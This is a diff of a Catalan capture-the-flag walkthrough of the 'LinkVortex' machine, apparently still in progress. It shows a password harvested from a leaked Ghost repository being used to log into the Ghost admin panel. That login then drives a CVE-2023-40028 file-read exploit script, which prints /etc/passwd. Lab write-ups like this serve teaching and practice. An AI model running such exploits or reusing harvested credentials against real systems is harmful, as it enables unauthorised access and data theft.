@@ -717,10 +717,35 @@ const email = 'test@example.com';
 const password = 'OctopiFociPilfer45';
 ```
 
-Provarem aquestes credencials a veure i alguna ens serveix per accedir per ssh a la màquina.
+Provarem aquestes credencials a veure i alguna ens serveix per accedir per ssh a la màquina. No hi ha hagut èxit al provar per ssh.
 
+Ara buscaré altra vegada contrasenyes dins el repositori a veure si trobo un correu complert com aquest test@example.com però que no sigui de test ja que el de test no ha funcionat. Provo de fer un grep al repositori però en comptes de amb test amb admin@ a veure si trobem algun usuari que sembli vàlid:
 
-Després de perdre el temps durant força estona amb les credencials obtingudes i d'intentar accedir a la pàgina de login que no carrega al fer clic si anem al domini a través del navegador web i de no poder connectar per ssh. Per tant, com que sabem quina tecnologia/eina utilitza la pàgina, que és Ghost (https://ghost.org/), si anem a veure el codi font podem veure'n la versió:
+````
+┌──(kali㉿kali)-[~/Documents/LinkVortex/Ghost]
+└─$ grep -r "admin@" .
+
+./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [adminRole]});
+./ghost/admin/tests/acceptance/staff-test.js://             await fillIn('.fullscreen-modal input[name="email"]', 'admin@example.com');
+./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [ownerRole]});
+./ghost/core/test/e2e-api/admin/users.test.js:            user: testUtils.DataGenerator.forKnex.createUser({email: 'test+admin@ghost.org', slug: 'admin'}),
+./yarn.lock:intersection-observer-admin@~0.3.2:
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await modal.getByLabel('Email').fill('newadmin@test.com');
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await expect(listItem.getByText('newadmin@test.com')).toBeVisible();
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                email: 'newadmin@test.com',
+./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
+````
+
+Ara aquestes credencials les provem al dashboard de ghost trobat a http://dev.linkvortex.htb/ghost:
+
+![image](https://github.com/user-attachments/assets/8f0a6dcd-12db-4d1c-a784-dba667f40959)
+
+Ara hem pogut per fi treure ús de les credencials i hem pogut accedir al dashboard de l'aplicació/programa Ghost. Ghost és un programa basat en NodeJS de gestió de continguts enfocat a blocs, amb multitud dintegracions i que permet una completa personalització de laspecte. En conjunt, és una solució que resulta molt amigable per a qualsevol desenvolupador. Però on realment destaca és el seu rendiment.
+
+![image](https://github.com/user-attachments/assets/f3083692-6f3b-4977-b951-bc3aa700332e)
+
+Ara estem al dashboard però no veiem res rellevant. Per tant, com que sabem quina tecnologia/eina utilitza la pàgina, que és Ghost (https://ghost.org/), si anem a veure el codi font podem veure'n la versió:
 
 </script>
 
@@ -749,59 +774,44 @@ Ara donem permisos d'execució a l'script i l'executem i el propi script ja ens 
 Usage: ./CVE-2023-40028.sh -u username -p password
 ````
 
-Per tant he fet vàries amb el nom d'usuari amb les password que hem trobat però no me'n he ensortit:
- ````                                                                                                                                                                                
-┌──(kali㉿kali)-[~/Documents/LinkVortex]
-└─$ ./CVE-2023-40028.sh -u admin -p OctopiFociPilfer45
-[!] INVALID USERNAME OR PASSWORD
-                                                                                                                                                                                                                                           
-┌──(kali㉿kali)-[~/Documents/LinkVortex]
-└─$ ./CVE-2023-40028.sh -u test -p OctopiFociPilfer45
-[!] INVALID USERNAME OR PASSWORD
-                                                                                                                                                                                                                                           
-┌──(kali㉿kali)-[~/Documents/LinkVortex]
-└─$ ./CVE-2023-40028.sh -u linkvortex -p OctopiFociPilfer45
-[!] INVALID USERNAME OR PASSWORD
-                                                              
-````
+I utilitzem l'script amb les credencials que hem accedit al dashboard de Ghost que ens permetrà accedir al fitxer del sistema que volem, com si féssim un cat:
 
-Per tant, ara buscaré altra vegada contrasenyes dins el repositori a veure si trobo un correu complert com aquest test@example.com però que no sigui de test ja que el de test no ha funcionat. Provo de fer un grep al repositori però en comptes de amb test amb admin@ a veure si trobem algun usuari que sembli vàlid:
-
-````
-┌──(kali㉿kali)-[~/Documents/LinkVortex/Ghost]
-└─$ grep -r "admin@" .
-
-./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [adminRole]});
-./ghost/admin/tests/acceptance/staff-test.js://             await fillIn('.fullscreen-modal input[name="email"]', 'admin@example.com');
-./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [ownerRole]});
-./ghost/core/test/e2e-api/admin/users.test.js:            user: testUtils.DataGenerator.forKnex.createUser({email: 'test+admin@ghost.org', slug: 'admin'}),
-./yarn.lock:intersection-observer-admin@~0.3.2:
-./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
-./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await modal.getByLabel('Email').fill('newadmin@test.com');
-./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await expect(listItem.getByText('newadmin@test.com')).toBeVisible();
-./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                email: 'newadmin@test.com',
-./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
-````
-
-N'hem trobat vàris, però tampoc funciona newadmin@test.com ni admin@example.com per tant provaré el nom de la màquina amb admin i la password trobada:
 ````
 ┌──(kali㉿kali)-[~/Documents/LinkVortex]
 └─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
 WELCOME TO THE CVE-2023-40028 SHELL
 file> 
 ````
+Per lògica, igual que a l'anterior màquina que vaig fer, l'Alert, miro d'extreure les dades del fitxer /etc/passwd per veure els usuaris i si fos el cas les contrasenyes que tenen en el servidor però no trobo res rellevant:
+````
+┌──(kali㉿kali)-[~/Documents/LinkVortex]
+└─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+WELCOME TO THE CVE-2023-40028 SHELL
+file> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+file> 
+````
 
 Sembla que ha funcionat, però no trobo res a través d'això. 
-
-Per tant, ara el següent pas serà provar aquestes credencials al dashboard de ghost trobat a http://dev.linkvortex.htb/ghost:
-
-![image](https://github.com/user-attachments/assets/8f0a6dcd-12db-4d1c-a784-dba667f40959)
-
-Ara hem pogut per fi treure ús de les credencials i hem pogut accedir al dashboard de l'aplicació/programa Ghost. Ghost és un programa basat en NodeJS de gestió de continguts enfocat a blocs, amb multitud dintegracions i que permet una completa personalització de laspecte. En conjunt, és una solució que resulta molt amigable per a qualsevol desenvolupador. Però on realment destaca és el seu rendiment.
-
-![image](https://github.com/user-attachments/assets/f3083692-6f3b-4977-b951-bc3aa700332e)
-
-
 
 MÀQUINA EN PROCÉS.
 
